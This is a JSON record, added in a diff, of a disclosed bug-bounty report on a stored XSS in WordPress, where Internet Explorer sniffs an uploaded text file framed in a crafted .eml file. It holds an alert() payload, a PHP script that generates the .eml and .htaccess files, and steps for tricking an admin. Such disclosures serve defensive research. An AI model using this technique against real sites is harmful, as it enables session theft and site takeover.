@@ -1,0 +1,480 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "informative", 
+    "bug_reporter_agreed_on_going_public_at": "2018-02-02T17:53:58.675Z", 
+    "voters": [
+        "exception"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 276105, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-02-02T18:58:35.324Z", 
+    "vulnerability_information": "Hi, \n\nIntroduction  \n---------------\n\nThe upload mechanism in WordPress works by the role of the user who's trying to upload something. So every role has a permission to upload certain files. For the lowest role like **author** can upload harmless file such as **txt**, png, gif, jpg, zip, with this file the author role can't attack any other user with these files. \n\nOne thing is that **txt** file is harmful! there is a way to make the files that it's `content-type` is `text/plain` to be served as `text/html` in IE all versions! \nSo author can upload a txt file and attack the admin and other users with XSS exploit can be so much harmful due the admin can write php code like this #263718. \n\n  \nTechnical Details \n--------------------\nIE running a content sniffing on unknown content-type and if the page that is being sniffed has an iframe to another page the sniffing will run on the framed page as well so, if the page contain html content the iframe content will be showed as HTML even if it's a text file! And `X-Content-Type-Options` is useless even if you set it's value to `nosniff` it will be sniffed by IE anyway. \n\nThis finding belong to Jan (https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)\n\n\nSteps to reproduce\n-----------\n\n1- Sing in using author account.\n2- Go to http://127.0.0.1/wordpress/wp-admin/upload.php.\n3- Upload a text file like this one **test.txt** contains the following code : \n`<html><script>alert(document.domain)</script></html>`.\n4- Get the file URL ex : http://127.0.0.1/wordpress/wp-content/uploads/2017/10/test.txt.\n5- Create eml file using SSH. follow the [article](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/) steps or you can use this php script that I made. \n\n`poc.php?url={URL of the Text file in wordpress path}`\n\n```\n<?php\n$url = urlencode($_GET['url']);\n$url = str_replace('%','=',$url);\n$eml_content = \n\"TESTME\nContent-Type: text/html\nContent-Transfer-Encoding: quoted-printable\n\n=3Chtml=3E=3Ch1=3EWordPress=3C=2Fhtml=3E\n=3Ciframe=20src=3D=27$url=27=3E=3C=2Fiframe=3E=0A\n\n\";\n$htaccess_content = \"AddType message/rfc822 .eml\nHeader add Content-Transfer-Encoding \\\"quoted-printable\\\"\";\n$eml_file = file_put_contents(\"test.eml\", $eml_content, FILE_APPEND | LOCK_EX );\n$htaccess_file = file_put_contents(\".htaccess\", $htaccess_content, FILE_APPEND | LOCK_EX );\n//echo $eml_content;\n?>\n```\n\n6- After you create `test.eml` and `.htaccess` go to test.eml in **any** Windows and any IE version and you will see an alert of WordPress host! \n\nLive PoC \n-----------------------\nJust create a file at this path `http://127.0.0.1/wordpress/wp-content/uploads/2017/10/test.txt` with the following code :\n`<html><script>alert(document.domain)</script></html>`\nAnd access this page using IE \nhttp://playground.ahussam.me/test.eml\n \n\nScreenshots \n----------------------------\n{F227941}\n\n{F227943}\n\nTest Environment \n-------------------------\nWindows 10, IE 11; Windows 8.1, IE 11; Windows 8 IE 10. \n\n  \n   \nIf you have any question I will be happy to answer it. \n\nI am waiting your reply. \n\nThanks for reading ", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "medium", 
+        "author_type": "User"
+    }, 
+    "title": "Stored XSS in WordPress", 
+    "is_member_of_team?": null, 
+    "vote_count": 1, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": null, 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Informative", 
+    "public": true, 
+    "attachments": [
+        {
+            "file_name": "wp1.png", 
+            "type": "image/png", 
+            "id": 227941, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/227/941/9060fd14e07b4caf3509fec52ead104ace7bed05/wp1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222724Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3e64342adcb6ee9cf49c61e25e789de4ce93999d73ffcc05bc7f817b83a30de4"
+        }, 
+        {
+            "file_name": "wp2.png", 
+            "type": "image/png", 
+            "id": 227943, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/227/943/6e92617ee30361a4f3f33a012ffc06f1510cf830/wp2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222724Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=141fd1ca7ffcad3642ae2355eaae896414825e540c5cf7a19545ba1c74dbae91"
+        }
+    ], 
+    "singular_disclosure_disabled": true, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-17T13:10:04.945Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-17T13:10:04.945Z", 
+            "actor": {
+                "username": "ocean90", 
+                "url": "/ocean90", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/087/938/addb42c6b313f843a4d6a80b3a0d72741205bfde_medium.jpg?1498752141"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hello @abdullah, thanks for your detailed report. Can you please explain why this is a security issue in WordPress? If I understand you correctly you'd have to create an eml file first which includes the content of the txt file. But what's the point in having the file in the upload directory of WordPress?", 
+            "markdown_message": "<p>Hello <a href=\"/abdullah\">@abdullah</a>, thanks for your detailed report. Can you please explain why this is a security issue in WordPress? If I understand you correctly you&#39;d have to create an eml file first which includes the content of the txt file. But what&#39;s the point in having the file in the upload directory of WordPress?</p>\n", 
+            "type": "Activities::BugNeedsMoreInfo", 
+            "id": 2072377, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-18T11:20:17.024Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-18T11:20:17.024Z", 
+            "actor": {
+                "username": "abdullah", 
+                "url": "/abdullah", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/517/937a99e5cf76ed5555e2b0bb15f5674ed7bbbaa1_medium.jpg?1418671306"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hi, because of the txt file is being stored in wordpress path it can run Js on the domain like steal cookie and bypass SOP. \nDo you want a video poc? ", 
+            "markdown_message": "<p>Hi, because of the txt file is being stored in wordpress path it can run Js on the domain like steal cookie and bypass SOP. <br>\nDo you want a video poc? </p>\n", 
+            "type": "Activities::BugNew", 
+            "id": 2077677, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-18T11:49:37.211Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-18T11:49:37.211Z", 
+            "actor": {
+                "username": "ocean90", 
+                "url": "/ocean90", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/087/938/addb42c6b313f843a4d6a80b3a0d72741205bfde_medium.jpg?1498752141"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hi @abdullah, yes a video would be helpful to fully understand the issue. Thank you!", 
+            "markdown_message": "<p>Hi <a href=\"/abdullah\">@abdullah</a>, yes a video would be helpful to fully understand the issue. Thank you!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2077765, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-19T21:38:53.165Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-19T21:38:53.165Z", 
+            "actor": {
+                "username": "abdullah", 
+                "url": "/abdullah", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/517/937a99e5cf76ed5555e2b0bb15f5674ed7bbbaa1_medium.jpg?1418671306"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "@ocean90  Hi, \n\nBefore I make a video I want you to understand what is going on. \nSince the TXT file is hosted on WordPress path that the author uploaded it.\nIt can be served as html file and that will cause stored XSS. \n\nThe issue of wordpress it's allow txt file uploading for author. \n", 
+            "markdown_message": "<p><a href=\"/ocean90\">@ocean90</a>  Hi, </p>\n\n<p>Before I make a video I want you to understand what is going on. <br>\nSince the TXT file is hosted on WordPress path that the author uploaded it.<br>\nIt can be served as html file and that will cause stored XSS. </p>\n\n<p>The issue of wordpress it&#39;s allow txt file uploading for author. </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2086349, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-28T08:44:12.628Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-28T08:44:12.628Z", 
+            "actor": {
+                "username": "abdullah", 
+                "url": "/abdullah", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/517/937a99e5cf76ed5555e2b0bb15f5674ed7bbbaa1_medium.jpg?1418671306"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "@ocean90 any update ? ", 
+            "markdown_message": "<p><a href=\"/ocean90\">@ocean90</a> any update ? </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2110071, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-28T17:32:05.359Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-28T17:32:05.359Z", 
+            "actor": {
+                "username": "iandunn", 
+                "url": "/iandunn", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/974/4a74c8e7efc3996e6fff3f72ddccc09ab92986a2_medium.jpg?1506561124"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hi, I think there are a couple confusing things about the report. Can you help clarify them?\n\n* What's the purpose of creating the `.eml` file? Was that just a simulation of a real email for the purposes of the PoC, or would you actually create that file in a real attack? \n* Is creating the `.eml` file a necessary step? Couldn't you just send a normal email to an admin account, with a link to the `.txt` file?\n\nIn other words, it sounds like these would be the minimal steps to reproduce:\n\n* As an Author, upload a `.txt` file with a malicious JavaScript payload\n* Trick an Admin into visiting that `.txt` file in IE (while not running in \"modern mode\")\n\nIs that correct?\n", 
+            "markdown_message": "<p>Hi, I think there are a couple confusing things about the report. Can you help clarify them?</p>\n\n<ul>\n<li>What&#39;s the purpose of creating the <code>.eml</code> file? Was that just a simulation of a real email for the purposes of the PoC, or would you actually create that file in a real attack? </li>\n<li>Is creating the <code>.eml</code> file a necessary step? Couldn&#39;t you just send a normal email to an admin account, with a link to the <code>.txt</code> file?</li>\n</ul>\n\n<p>In other words, it sounds like these would be the minimal steps to reproduce:</p>\n\n<ul>\n<li>As an Author, upload a <code>.txt</code> file with a malicious JavaScript payload</li>\n<li>Trick an Admin into visiting that <code>.txt</code> file in IE (while not running in &quot;modern mode&quot;)</li>\n</ul>\n\n<p>Is that correct?</p>\n", 
+            "type": "Activities::BugNeedsMoreInfo", 
+            "id": 2110431, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-31T21:58:50.663Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-31T21:58:50.663Z", 
+            "actor": {
+                "username": "abdullah", 
+                "url": "/abdullah", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/517/937a99e5cf76ed5555e2b0bb15f5674ed7bbbaa1_medium.jpg?1418671306"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hi, @iandunn @ocean90 \n\n* The purpose of creating the .eml file is to force the IE browser to preform content sniffing. You should create it to trigger this attack. \n* Is creating the .eml file a necessary step? Answer : Yes, as I said before.\n\nStep of Reproduce : \n\n1- Author upload a `.txt` file with a malicious JavaScript payload. \n2- Create the `.eml`. and framing the txt file (create an Iframe to txt file URL) inside the `.eml` file. \n3- Trick an Admin into visiting the URL of `.eml` file in IE (at any mode!).\n\n If you have any question I can create a live PoC in any wordpress demo you have. \n\nBest Regards ", 
+            "markdown_message": "<p>Hi, <a href=\"/iandunn\">@iandunn</a> <a href=\"/ocean90\">@ocean90</a> </p>\n\n<ul>\n<li>The purpose of creating the .eml file is to force the IE browser to preform content sniffing. You should create it to trigger this attack. </li>\n<li>Is creating the .eml file a necessary step? Answer : Yes, as I said before.</li>\n</ul>\n\n<p>Step of Reproduce : </p>\n\n<p>1- Author upload a <code>.txt</code> file with a malicious JavaScript payload. <br>\n2- Create the <code>.eml</code>. and framing the txt file (create an Iframe to txt file URL) inside the <code>.eml</code> file. <br>\n3- Trick an Admin into visiting the URL of <code>.eml</code> file in IE (at any mode!).</p>\n\n<p>If you have any question I can create a live PoC in any wordpress demo you have. </p>\n\n<p>Best Regards </p>\n", 
+            "type": "Activities::BugNew", 
+            "id": 2119364, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-17T10:54:12.504Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-17T10:54:12.504Z", 
+            "actor": {
+                "username": "abdullah", 
+                "url": "/abdullah", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/517/937a99e5cf76ed5555e2b0bb15f5674ed7bbbaa1_medium.jpg?1418671306"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hi, any update? \n@iandunn @ocean90  \n", 
+            "markdown_message": "<p>Hi, any update? <br>\n<a href=\"/iandunn\">@iandunn</a> <a href=\"/ocean90\">@ocean90</a>  </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2164788, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-17T15:08:27.582Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-17T15:08:27.582Z", 
+            "actor": {
+                "username": "iandunn", 
+                "url": "/iandunn", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/974/4a74c8e7efc3996e6fff3f72ddccc09ab92986a2_medium.jpg?1506561124"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Not yet, we're a small team of volunteers, and we've got a backlog of reports that we're working through. I can't get you a specific estimate on when we'll have time to get to this, but the details in your previous comment help to make things more clear, and this is definitely in our queue.", 
+            "markdown_message": "<p>Not yet, we&#39;re a small team of volunteers, and we&#39;ve got a backlog of reports that we&#39;re working through. I can&#39;t get you a specific estimate on when we&#39;ll have time to get to this, but the details in your previous comment help to make things more clear, and this is definitely in our queue.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2165344, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-12-31T08:24:53.993Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-31T08:24:53.993Z", 
+            "actor": {
+                "username": "abdullah", 
+                "url": "/abdullah", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/517/937a99e5cf76ed5555e2b0bb15f5674ed7bbbaa1_medium.jpg?1418671306"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "@iandunn  @ocean90  any update? it has been more than a month since your last reply.  ", 
+            "markdown_message": "<p><a href=\"/iandunn\">@iandunn</a>  <a href=\"/ocean90\">@ocean90</a>  any update? it has been more than a month since your last reply.  </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2253609, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-12-31T17:19:15.898Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-31T17:19:15.898Z", 
+            "actor": {
+                "username": "iandunn", 
+                "url": "/iandunn", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/974/4a74c8e7efc3996e6fff3f72ddccc09ab92986a2_medium.jpg?1506561124"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "We haven't been able to make any progress here yet, we still have higher-severity reports that we're focusing on right now. This is still in our queue, though. I know that can be frustrating, but I appreciate your patience.", 
+            "markdown_message": "<p>We haven&#39;t been able to make any progress here yet, we still have higher-severity reports that we&#39;re focusing on right now. This is still in our queue, though. I know that can be frustrating, but I appreciate your patience.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2254048, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-01T19:53:05.142Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-01T19:53:05.142Z", 
+            "actor": {
+                "username": "abdullah", 
+                "url": "/abdullah", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/517/937a99e5cf76ed5555e2b0bb15f5674ed7bbbaa1_medium.jpg?1418671306"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "@iandunn @ocean90 Hi, So I finished a write-up about this issue I am going to publish it after 6 days from now. Since there is no progress or reply from your side maybe open-source people will help to create a patch or users will be aware of the issue. \n\nThanks ", 
+            "markdown_message": "<p><a href=\"/iandunn\">@iandunn</a> <a href=\"/ocean90\">@ocean90</a> Hi, So I finished a write-up about this issue I am going to publish it after 6 days from now. Since there is no progress or reply from your side maybe open-source people will help to create a patch or users will be aware of the issue. </p>\n\n<p>Thanks </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2342892, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-02T17:30:45.919Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-02T17:30:45.919Z", 
+            "actor": {
+                "username": "ocean90", 
+                "url": "/ocean90", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/087/938/addb42c6b313f843a4d6a80b3a0d72741205bfde_medium.jpg?1498752141"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hello @abdullah, sorry for being too quiet here.\n\nThanks again for your report. We have discussed this internally and decided to not take any further action here. While the report is technically valid it's very edge-casey. Only fixing this by preventing uploads of txt files isn't a viable solution for us.\nOf course, you're free to publish your write-up. Maybe you can post a link here if it's published.\n\nFor the reasons mentioned above I'm going to close this report as informative.\n\nThanks,\nDominik", 
+            "markdown_message": "<p>Hello <a href=\"/abdullah\">@abdullah</a>, sorry for being too quiet here.</p>\n\n<p>Thanks again for your report. We have discussed this internally and decided to not take any further action here. While the report is technically valid it&#39;s very edge-casey. Only fixing this by preventing uploads of txt files isn&#39;t a viable solution for us.<br>\nOf course, you&#39;re free to publish your write-up. Maybe you can post a link here if it&#39;s published.</p>\n\n<p>For the reasons mentioned above I&#39;m going to close this report as informative.</p>\n\n<p>Thanks,<br>\nDominik</p>\n", 
+            "type": "Activities::BugInformative", 
+            "id": 2345885, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-02T17:53:58.717Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-02T17:53:58.717Z", 
+            "actor": {
+                "username": "abdullah", 
+                "url": "/abdullah", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/517/937a99e5cf76ed5555e2b0bb15f5674ed7bbbaa1_medium.jpg?1418671306"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "first_to_agree": true, 
+            "message": "Hello, \nSo after waiting more than 4 months this report got closed as Informative imm okay.  Could you approve the PD, please? \n\nThanks", 
+            "markdown_message": "<p>Hello, <br>\nSo after waiting more than 4 months this report got closed as Informative imm okay.  Could you approve the PD, please? </p>\n\n<p>Thanks</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2345937, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-02T18:58:35.347Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-02T18:58:35.347Z", 
+            "actor": {
+                "username": "aaroncampbell", 
+                "url": "/aaroncampbell", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/821/6f1bfb789e2f97a2c2ca81a5e6ab6f7b3581ad4a_medium.jpg?1515860728"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2346260, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-02T18:58:35.402Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-02T18:58:35.402Z", 
+            "actor": {
+                "username": "aaroncampbell", 
+                "url": "/aaroncampbell", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/821/6f1bfb789e2f97a2c2ca81a5e6ab6f7b3581ad4a_medium.jpg?1515860728"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2346261, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "reporter": {
+        "username": "abdullah", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/abdullah", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/002/517/56f6f161e977d237203926da4f58ec2fb369dc40_small.jpg?1418671306"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 62, 
+        "name": "Cross-site Scripting (XSS) - Stored"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "disclosed_at": "2018-02-02T18:58:35.379Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/276105", 
+    "created_at": "2017-10-10T13:09:11.299Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>Hi, </p>\n\n<h2 id=\"introduction\">Introduction  </h2>\n\n<p>The upload mechanism in WordPress works by the role of the user who&#39;s trying to upload something. So every role has a permission to upload certain files. For the lowest role like <strong>author</strong> can upload harmless file such as <strong>txt</strong>, png, gif, jpg, zip, with this file the author role can&#39;t attack any other user with these files. </p>\n\n<p>One thing is that <strong>txt</strong> file is harmful! there is a way to make the files that it&#39;s <code>content-type</code> is <code>text/plain</code> to be served as <code>text/html</code> in IE all versions! <br>\nSo author can upload a txt file and attack the admin and other users with XSS exploit can be so much harmful due the admin can write php code like this <a href=\"/reports/263718\">#263718</a>. </p>\n\n<h2 id=\"technical-details\">Technical Details </h2>\n\n<p>IE running a content sniffing on unknown content-type and if the page that is being sniffed has an iframe to another page the sniffing will run on the framed page as well so, if the page contain html content the iframe content will be showed as HTML even if it&#39;s a text file! And <code>X-Content-Type-Options</code> is useless even if you set it&#39;s value to <code>nosniff</code> it will be sniffed by IE anyway. </p>\n\n<p>This finding belong to Jan (<a title=\"https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/\" href=\"/redirect?signature=e3783521696329854d11d0bc78c19044612e7816&amp;url=https%3A%2F%2Fjankopecky.net%2Findex.php%2F2017%2F04%2F18%2F0day-textplain-considered-harmful%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/</span><i class=\"icon-external-link\"></i></a>)</p>\n\n<h2 id=\"steps-to-reproduce\">Steps to reproduce</h2>\n\n<p>1- Sing in using author account.<br>\n2- Go to <a title=\"http://127.0.0.1/wordpress/wp-admin/upload.php\" href=\"/redirect?signature=7cb7147beeb26ce4d69b0f16a0a2bc123686e8c9&amp;url=http%3A%2F%2F127.0.0.1%2Fwordpress%2Fwp-admin%2Fupload.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://127.0.0.1/wordpress/wp-admin/upload.php</span><i class=\"icon-external-link\"></i></a>.<br>\n3- Upload a text file like this one <strong>test.txt</strong> contains the following code : <br>\n<code>&lt;html&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/html&gt;</code>.<br>\n4- Get the file URL ex : <a title=\"http://127.0.0.1/wordpress/wp-content/uploads/2017/10/test.txt\" href=\"/redirect?signature=d86ea4f88f9532d779a383e6a4c386d08eea4b80&amp;url=http%3A%2F%2F127.0.0.1%2Fwordpress%2Fwp-content%2Fuploads%2F2017%2F10%2Ftest.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://127.0.0.1/wordpress/wp-content/uploads/2017/10/test.txt</span><i class=\"icon-external-link\"></i></a>.<br>\n5- Create eml file using SSH. follow the <a href=\"/redirect?signature=e3783521696329854d11d0bc78c19044612e7816&amp;url=https%3A%2F%2Fjankopecky.net%2Findex.php%2F2017%2F04%2F18%2F0day-textplain-considered-harmful%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>article</span><i class=\"icon-external-link\"></i></a> steps or you can use this php script that I made. </p>\n\n<p><code>poc.php?url={URL of the Text file in wordpress path}</code></p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\n$url = urlencode($_GET[&#39;url&#39;]);\n$url = 